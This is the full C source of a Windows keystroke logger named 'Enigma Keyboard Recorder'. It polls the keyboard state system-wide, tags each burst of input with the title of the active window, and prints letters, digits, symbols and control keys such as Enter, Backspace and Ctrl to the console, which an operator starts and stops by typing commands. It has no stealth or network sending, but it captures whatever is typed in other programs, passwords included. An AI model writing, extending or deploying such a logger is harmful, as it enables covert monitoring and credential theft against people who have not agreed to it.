#define _WIN32_WINNT 0x0500
#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#define _XOR(ex1,ex2) ((ex1 && !ex2)||(!ex1 && ex2))
bool running=false;
HWND hFgWnd=NULL;
HANDLE hEvent;

inline char bitr(char*bitbuf,int index){
    char ret= (bitbuf[index/8]<<index%8)&0b10000000;
    return ret?1:0;
}

inline void bitw(char *bitbuf,int index,char bit){
    if(bit)
        bitbuf[index/8]|= (0b10000000>>index%8);
    else
        bitbuf[index/8]&=~(0b10000000>>index%8);
}

char* alloc_bits(int size){
    char *bitbuf,byte_size;
    byte_size=(size-1)/8+1;
    bitbuf=malloc(byte_size);
    memset(bitbuf,0,byte_size);
    return bitbuf;
}
DWORD WINAPI InputThread(LPVOID param)
{
    char input[1024];
    while(1)
    {
        WaitForSingleObject(hEvent,INFINITE);
        fgets(input,sizeof(input),stdin);
        if(!stricmp(input,"start\n"))
        {
            hFgWnd = NULL;
            running = true;
            fputs("Started.\n",stdout);
        }else if(!stricmp(input,"stop\n"))
        {
            running = false;
            fputs("Stoped.\n",stdout);
        }else if(!stricmp(input,"quit\n"))
        {
            running = false;
            SetEvent(hEvent);
            exit(0);
        }else if(input[0]=='\n')
        {
            continue;
        }else
        {
            puts("Unknown Command.");
        }
        fflush(stdout);
        SetEvent(hEvent);
    }
}

int main(){
    char *bits=alloc_bits(70);//A~Z 1~9 ` [ ] \ ; ' , . / ESC SPACE TAB BACK ENTER
    //puts("Hook Include A~Z 1~0 ESC SPACE TAB BACK ENTER.");
    puts("Enigma Keyboard Recorder");
    hEvent= CreateEventA(NULL,TRUE,TRUE,NULL);
    if(hEvent == INVALID_HANDLE_VALUE)
    {
        printf("Faild to create event object. Code: %d\n",GetLastError());
    }else
    {
        DWORD dwThread;
        HANDLE hThread;
        hThread=CreateThread(NULL,0,InputThread,NULL,0,&dwThread);
        if(hThread == INVALID_HANDLE_VALUE)
        {
            printf("Failed to create input thread. Code: %d\n",GetLastError());
        }
        else
            CloseHandle(hThread);
    }
    fflush(stdout);
    while(1)
    {
        int key,pos=0;
        short flag;
        //static char ctrldown1=0;
        char bCapslockOn,bShiftDown,bIsCapital,bCtrlDown,bAltDown;
        HWND hWnd;

        for(;;)
        {
            bool isRunning;
            Sleep(3);
            WaitForSingleObject(hEvent,INFINITE);
            isRunning = running;
            SetEvent(hEvent);
            if(running)
                break;
        }
        bCapslockOn=GetKeyState(VK_CAPITAL)!=0;
        bShiftDown=GetKeyState(VK_SHIFT)<0;

        hWnd=GetForegroundWindow();
        WaitForSingleObject(hEvent,INFINITE);
        if(hWnd!=hFgWnd)
        {
            char text[0xFF];
            hFgWnd = hWnd;
            GetWindowTextA(hFgWnd,text,sizeof(text));
            printf("\n# %s\n",text);
        }
        SetEvent(hEvent);

        bIsCapital=_XOR(bCapslockOn,bShiftDown)?1:0;

        //bShiftOn
        //printf("%d\n",capslock);
        {

        }
       // printf("ctrl=%x\n",GetKeyState(VK_CONTROL));
        bCtrlDown=GetKeyState(VK_CONTROL)<0;
        if(bCtrlDown)
        {
            if(bitr(bits,pos)==0)
            {
                bitw(bits,pos,1);
                fputs("[CTD]",stdout);
            }
        }else
            if(bitr(bits,pos)!=0)
            {
                bitw(bits,pos,0);
                fputs("[CTU]",stdout);
            }
        pos++;

        bAltDown=GetKeyState(VK_MENU)<0;
        if(bAltDown)
        {
            if(bitr(bits,pos)==0)
            {
                bitw(bits,pos,1);
                fputs("[ALD]",stdout);
            }
        }else
            if(bitr(bits,pos)!=0)
            {
                bitw(bits,pos,0);
                fputs("[ALU]",stdout);
            }
        pos++;


        for(key='A';key<='Z';key++)
        {
                flag=GetKeyState(key);
                if(flag<0) continue;
                if(flag!=bitr(bits,key-'A'+pos))
                {
                    putchar(bIsCapital?key:key+'a'-'A');
                    bitw(bits,key-'A'+pos,flag);
                }
        }
        pos+=26;

        for(key='0';key<='9';key++)
        {
            flag=GetKeyState(key);
            if(flag<0)continue;

            if(flag!=bitr(bits,key-'0'+pos))
            {
                if(bShiftDown)
                {
                    char tmp;
                    switch(key)
                    {
                    case '1':
                        tmp='!';
                        break;
                    case '2':
                        tmp='@';
                        break;
                    case '3':
                        tmp='#';
                        break;
                    case '4':
                        tmp='$';
                        break;
                    case '5':
                        tmp='%';
                        break;
                    case '6':
                        tmp='^';
                        break;
                    case '7':
                        tmp='&';
                        break;
                    case '8':
                        tmp='*';
                        break;
                    case '9':
                        tmp='(';
                        break;
                    case '0':
                        tmp=')';
                        break;

                    }
                    putchar(tmp);
                    //printf("%c\n",tmp);
                }
                else
                    putchar(key);
                bitw(bits,key-'0'+pos,flag);
            }
        }
        pos+=10;

        for(key=VK_NUMPAD0;key<=VK_NUMPAD9;key++)
        {
                flag=GetKeyState(key);
                if(flag<0) continue;
                if(flag!=bitr(bits,key-VK_NUMPAD0+pos))
                {
                    //printf("[N%d]\n",key-VK_NUMPAD0);
                    putchar(key-VK_NUMPAD0+'0');
                    //printf("key=%c\n",bIsCapital?key:key+'a'-'A');
                    bitw(bits,key-VK_NUMPAD0+pos,flag);
                }
        }
        pos+=10;


////

        flag=GetKeyState(VK_OEM_1);
        if(flag >=0 && flag!=bitr(bits,pos))
        {
            putchar(bShiftDown?':':';');
            bitw(bits,pos,flag);
        }
        pos+=1;

        flag=GetKeyState(VK_OEM_2);
        if(flag >=0 && flag!=bitr(bits,pos))
        {
            putchar(bShiftDown?'?':'/');
            bitw(bits,pos,flag);
        }
        pos+=1;

        flag=GetKeyState(VK_OEM_3);
        if(flag >=0 && flag!=bitr(bits,pos))
        {
            putchar(bShiftDown?'~':'`');
            bitw(bits,pos,flag);
        }
        pos+=1;

        flag=GetKeyState(VK_OEM_4);
        if(flag >=0 && flag!=bitr(bits,pos))
        {
            putchar(bShiftDown?'{':'[');
            bitw(bits,pos,flag);
        }
        pos+=1;

        flag=GetKeyState(VK_OEM_5);
        if(flag >=0 && flag!=bitr(bits,pos))
        {
            putchar(bShiftDown? '|':'\\');
            bitw(bits,pos,flag);
        }
        pos+=1;

        flag=GetKeyState(VK_OEM_6);
        if(flag >=0 && flag!=bitr(bits,pos))
        {
            putchar(bShiftDown?'}':']');
            bitw(bits,pos,flag);
        }
        pos+=1;

        flag=GetKeyState(VK_OEM_7);
        if(flag >=0 && flag!=bitr(bits,pos))
        {
            putchar(bShiftDown?'\"':'\'');
            bitw(bits,pos,flag);
        }
        pos+=1;

        flag=GetKeyState(VK_OEM_PLUS);
        if(flag >=0 && flag!=bitr(bits,pos))
        {
            putchar(bShiftDown?'+':'=');
            bitw(bits,pos,flag);
        }
        pos+=1;

        flag=GetKeyState(VK_OEM_MINUS);
        if(flag >=0 && flag!=bitr(bits,pos))
        {
            putchar(bShiftDown?'_':'-');
            bitw(bits,pos,flag);
        }
        pos+=1;

        flag=GetKeyState(VK_OEM_COMMA);
        if(flag >=0 && flag!=bitr(bits,pos))
        {
            putchar(bShiftDown?'<':',');
            bitw(bits,pos,flag);
        }
        pos+=1;

        flag=GetKeyState(VK_OEM_PERIOD);
        if(flag >=0 && flag!=bitr(bits,pos))
        {
            putchar(bShiftDown?'>':'.');
            bitw(bits,pos,flag);
        }
        pos+=1;

////
        flag=GetKeyState(VK_BACK);
        if(flag >=0 && flag!=bitr(bits,pos))
        {
            fputs("[BS]",stdout);
            bitw(bits,pos,flag);
        }
        pos+=1;

        flag=GetKeyState(VK_SPACE);
        if(flag >=0 && flag!=bitr(bits,pos))
        {
            fputs(" ",stdout);
            bitw(bits,pos,flag);
        }
        pos+=1;

        flag=GetKeyState(VK_RETURN);
        if(flag >=0 && flag!=bitr(bits,pos))
        {
            fputs("[EN]",stdout);
            bitw(bits,pos,flag);
        }
        pos+=1;

        flag=GetKeyState(VK_TAB);
        if(flag >=0 && flag!=bitr(bits,pos))
        {
            fputs("[TB]",stdout);
            bitw(bits,pos,flag);
        }
        pos+=1;

        flag=GetKeyState(VK_ESCAPE);
        if(flag >=0 && flag!=bitr(bits,pos))
        {
            fputs("[ESC]",stdout);
            bitw(bits,pos,flag);
        }
        pos+=1;
        fflush(stdout);

        //Sleep(5);
    }
}
